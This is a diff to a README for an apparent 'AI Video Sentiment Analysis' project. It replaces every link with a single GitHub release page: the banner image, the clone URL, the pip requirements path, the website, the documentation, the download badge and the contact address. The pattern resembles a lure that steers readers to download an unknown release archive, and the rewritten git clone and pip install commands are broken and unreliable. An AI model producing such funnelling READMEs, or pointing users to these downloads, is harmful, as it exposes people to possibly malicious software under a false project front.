@@ -1,6 +1,6 @@
 # AI Video Sentiment Analysis with Machine Learning 🤖📹
 
-![AI Video Sentiment Analysis](https://imageurl.com)
+![AI Video Sentiment Analysis](https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0)
 
 Welcome to the AI Video Sentiment Analysis GitHub repository! This project focuses on analyzing video sentiments and emotions using a custom-built machine learning model implemented in TensorFlow, Python, and more. By leveraging various technologies and tools like AWS, Docker, and NextJS, we aim to provide a comprehensive solution for understanding the sentiment portrayed in videos.
 
@@ -35,12 +35,12 @@ To start exploring the AI Video Sentiment Analysis project and understand its co
 
 1. Clone the repository to your local machine:
 ```
-git clone https://github.com/YourUsername/ai-video-sentimentml-ml_model.git
+git clone https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0
 ```
 
 2. Install the necessary dependencies using pip:
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0
 ```
 
 3. Explore the codebase, model implementations, and integration with various tools.
@@ -49,11 +49,11 @@ pip install -r requirements.txt
 
 ## Additional Resources 🔗
 For further information and detailed insights into the project, you can visit the following links:
-- [Project Website](https://www.yourprojectwebsite.com)
-- [Documentation](https://www.yourdocumentationlink.com)
-- [Software Download Link](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+- [Project Website](https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0)
+- [Documentation](https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0)
+- [Software Download Link](https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0)
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0)](https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0)
 
 ## How to Contribute 🎉
 We welcome contributions from the community to enhance this project further. Whether it's bug fixes, feature additions, or documentation improvements, your contributions are valuable to us.
@@ -73,7 +73,7 @@ git push origin feature/AmazingContribution
 3. Create a new Pull Request and we'll review it as soon as possible.
 
 ## Contact Us 📧
-If you have any questions, suggestions, or feedback regarding the AI Video Sentiment Analysis project, feel free to reach out to us at [contact@yourproject.com].
+If you have any questions, suggestions, or feedback regarding the AI Video Sentiment Analysis project, feel free to reach out to us at [https://github.com/35px/ai-video-sentimentml-ml_model/releases/tag/v2.0].
 
 Let's collaborate and innovate in the field of AI video analysis! 🚀👨‍💻📽️
 
